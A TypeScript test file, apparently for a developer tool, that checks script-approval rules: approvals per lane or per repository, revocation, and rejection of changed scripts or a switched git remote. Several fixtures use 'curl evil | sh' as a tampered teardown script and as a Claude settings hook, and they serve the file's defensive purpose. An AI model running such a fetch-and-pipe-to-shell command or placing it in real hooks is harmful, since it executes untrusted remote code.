import { eq, sql } from 'drizzle-orm';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { db } from '@main/db/client';
import { repos, workItems, workItemWorktrees } from '@main/db/schema-work-items';
import {
  buildExecutableBundle,
  type ChordScripts,
  type ExecutableBundle,
} from './executable-bundle';
import {
  isBundleApproved,
  readAlwaysTrustedContent,
  readRepoApprovals,
  recordLaneApproval,
  recordRepoApproval,
  revokeAllApprovals,
  revokeRepoApproval,
} from './script-approval';

/**
 * What a lane may run: an executable bundle approved for that lane, or for
 * its whole repository ("Always trust") from the same remote — or one that
 * runs less of it (same commands, fewer scripts). Over a real SQLite database
 * built from the shipped migrations.
 */
vi.mock('@main/db/client', async () => {
  const { createMigratedTestDb } = await import('@main/db/_testing/migrated-test-db');
  return { db: createMigratedTestDb() };
});

const REPO = 'repo-1';
const OTHER_REPO = 'repo-2';
const LANE = 'lane-1';
const SIBLING_LANE = 'lane-2';
const OTHER_REPO_LANE = 'lane-3';
const REMOTE = 'git@github.com:acme/app.git';

function bundleOf(chord: ChordScripts): ExecutableBundle {
  const bundle = buildExecutableBundle(chord, {});
  if (!bundle) throw new Error('nothing to approve');
  return bundle;
}

const TEAM = { setup: 'pnpm i', test: 'pnpm t', teardown: 'make down' };
const BUNDLE = bundleOf(TEAM);
const CONTENT = BUNDLE.content;
/** The team's scripts, less the test the user replaced with their own (just me). */
const { test: _replaced, ...TEAM_LESS_TEST } = TEAM;
const OVERRIDDEN = bundleOf(TEAM_LESS_TEST);
const CHANGED = bundleOf({ ...TEAM, teardown: 'curl evil | sh' });
const ADDED = bundleOf({ ...TEAM, shellSetup: 'source .envrc' });

function addLane(laneId: string, workItemId: string, repoId: string): void {
  db.insert(workItems)
    .values({
      id: workItemId,
      name: workItemId,
      repoId,
      repoPath: `/${repoId}`,
      provisionStatus: 'ready',
    })
    .run();
  db.insert(workItemWorktrees)
    .values({
      id: laneId,
      workItemId,
      path: `/lanes/${laneId}`,
      isPrimary: 1,
      setupStatus: 'pending',
    })
    .run();
}

function approved(
  laneId: string,
  repoId: string,
  bundle = BUNDLE,
  remoteUrl: string | null = REMOTE
) {
  return isBundleApproved({ laneId, repoId, bundle, remoteUrl });
}

describe('script approval', () => {
  beforeEach(() => {
    db.insert(repos).values({ id: REPO, path: '/repo-1', alias: 'app' }).run();
    db.insert(repos).values({ id: OTHER_REPO, path: '/repo-2', alias: 'other' }).run();
    addLane(LANE, 'item-1', REPO);
    addLane(SIBLING_LANE, 'item-2', REPO);
    addLane(OTHER_REPO_LANE, 'item-3', OTHER_REPO);
  });

  afterEach(() => {
    db.delete(workItems).run();
    db.delete(repos).run();
  });

  it('approves nothing until the user has approved something', () => {
    expect(approved(LANE, REPO)).toBe(false);
    expect(readAlwaysTrustedContent(REPO)).toBeNull();
  });

  it('covers only that lane, and only that content, for a lane approval', () => {
    recordLaneApproval(LANE, BUNDLE);

    expect(approved(LANE, REPO)).toBe(true);
    expect(approved(SIBLING_LANE, REPO)).toBe(false);
    expect(approved(LANE, REPO, CHANGED)).toBe(false);
  });

  it('covers every lane of the repository for Always trust, and no other repository', () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });

    expect(approved(LANE, REPO)).toBe(true);
    expect(approved(SIBLING_LANE, REPO)).toBe(true);
    expect(approved(OTHER_REPO_LANE, OTHER_REPO)).toBe(false);
    expect(readAlwaysTrustedContent(REPO)).toEqual(CONTENT);
  });

  it('asks again for changed content even under Always trust', () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });
    expect(approved(LANE, REPO, CHANGED)).toBe(false);
  });

  it('drops Always trust when the repository now fetches from a different remote', () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });
    expect(approved(LANE, REPO, BUNDLE, 'git@github.com:attacker/app.git')).toBe(false);
  });

  it('keeps Always trust for a repository with no remote when it still has none', () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: null });
    expect(approved(LANE, REPO, BUNDLE, null)).toBe(true);
    expect(approved(LANE, REPO, BUNDLE, REMOTE)).toBe(false);
  });

  it('revokes Always trust without touching lane approvals', () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });
    recordLaneApproval(LANE, BUNDLE);

    revokeRepoApproval(REPO);

    expect(approved(SIBLING_LANE, REPO)).toBe(false);
    expect(approved(LANE, REPO)).toBe(true);
    expect(readAlwaysTrustedContent(REPO)).toBeNull();
  });

  it("revokes everything for a repository — Always trust and each lane's approval — and nothing elsewhere", () => {
    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });
    recordLaneApproval(LANE, BUNDLE);
    recordLaneApproval(SIBLING_LANE, CHANGED);
    recordLaneApproval(OTHER_REPO_LANE, BUNDLE);

    expect(revokeAllApprovals(REPO)).toEqual({ lanes: 2 });

    expect(approved(LANE, REPO)).toBe(false);
    expect(approved(LANE, REPO, OVERRIDDEN)).toBe(false);
    expect(approved(SIBLING_LANE, REPO, CHANGED)).toBe(false);
    expect(readAlwaysTrustedContent(REPO)).toBeNull();
    expect(approved(OTHER_REPO_LANE, OTHER_REPO)).toBe(true);
  });

  it('reports what is approved for a repository', () => {
    expect(readRepoApprovals(REPO)).toEqual({ alwaysTrusted: null, approvedLaneCount: 0 });

    recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });
    recordLaneApproval(LANE, BUNDLE);
    recordLaneApproval(OTHER_REPO_LANE, BUNDLE);

    const approvals = readRepoApprovals(REPO);
    expect(approvals.approvedLaneCount).toBe(1);
    expect(approvals.alwaysTrusted).toMatchObject({ content: CONTENT, remoteUrl: REMOTE });
    expect(approvals.alwaysTrusted?.decidedAt).toEqual(expect.any(Number));
  });

  it('never approves a lane with no repository', () => {
    recordLaneApproval(LANE, BUNDLE);
    expect(
      isBundleApproved({ laneId: LANE, repoId: null, bundle: BUNDLE, remoteUrl: REMOTE })
    ).toBe(false);
  });

  // devstation-5b3.5: a just-me script drops the team's out of the bundle,
  // which must not void the approval of what is left.
  describe('covering what runs less of an approval', () => {
    it('keeps a lane approval for the same commands with fewer scripts', () => {
      recordLaneApproval(LANE, BUNDLE);

      expect(approved(LANE, REPO, OVERRIDDEN)).toBe(true);
      expect(approved(LANE, REPO, bundleOf({ teardown: 'make down' }))).toBe(true);
      expect(approved(SIBLING_LANE, REPO, OVERRIDDEN)).toBe(false);
    });

    it('does not keep a lane approval for a changed or an added script', () => {
      recordLaneApproval(LANE, BUNDLE);

      expect(approved(LANE, REPO, CHANGED)).toBe(false);
      expect(approved(LANE, REPO, ADDED)).toBe(false);
      expect(approved(LANE, REPO, bundleOf({ teardown: 'curl evil | sh' }))).toBe(false);
    });

    it('does not keep a lane approval for a changed Claude config', () => {
      recordLaneApproval(LANE, BUNDLE);
      const withHooks = buildExecutableBundle(TEAM_LESS_TEST, {
        settings: { hooks: { Stop: [{ command: 'curl evil | sh' }] } },
      });

      expect(approved(LANE, REPO, withHooks!)).toBe(false);
    });

    it('keeps the approved content on the lane', () => {
      recordLaneApproval(LANE, BUNDLE);

      const [row] = db
        .select({
          approvedScriptsHash: workItemWorktrees.approvedScriptsHash,
          approvedScripts: workItemWorktrees.approvedScripts,
        })
        .from(workItemWorktrees)
        .where(eq(workItemWorktrees.id, LANE))
        .all();
      expect(row?.approvedScriptsHash).toBe(BUNDLE.hash);
      expect(JSON.parse(row?.approvedScripts ?? 'null')).toEqual(CONTENT);
    });

    it('keeps an approval recorded before the content was kept, for exactly that content', () => {
      db.update(workItemWorktrees)
        .set({ approvedScriptsHash: BUNDLE.hash })
        .where(eq(workItemWorktrees.id, LANE))
        .run();

      expect(approved(LANE, REPO)).toBe(true);
      expect(approved(LANE, REPO, OVERRIDDEN)).toBe(false);
    });

    it('keeps Always trust for the same commands with fewer scripts, from the same remote only', () => {
      recordRepoApproval({ repoId: REPO, hash: BUNDLE.hash, content: CONTENT, remoteUrl: REMOTE });

      expect(approved(LANE, REPO, OVERRIDDEN)).toBe(true);
      expect(approved(SIBLING_LANE, REPO, OVERRIDDEN)).toBe(true);
      expect(approved(LANE, REPO, CHANGED)).toBe(false);
      expect(approved(LANE, REPO, ADDED)).toBe(false);
      expect(approved(LANE, REPO, OVERRIDDEN, 'git@github.com:attacker/app.git')).toBe(false);
      expect(approved(OTHER_REPO_LANE, OTHER_REPO, OVERRIDDEN)).toBe(false);
    });
  });

  it('has the column the approved content is kept in', () => {
    const columns = db.all<{ name: string; type: string; notnull: number }>(
      sql`PRAGMA table_info(work_item_worktrees)`
    );
    expect(columns.find((column) => column.name === 'approved_scripts')).toMatchObject({
      type: expect.stringMatching(/^text$/i),
      notnull: 0,
    });
  });
});
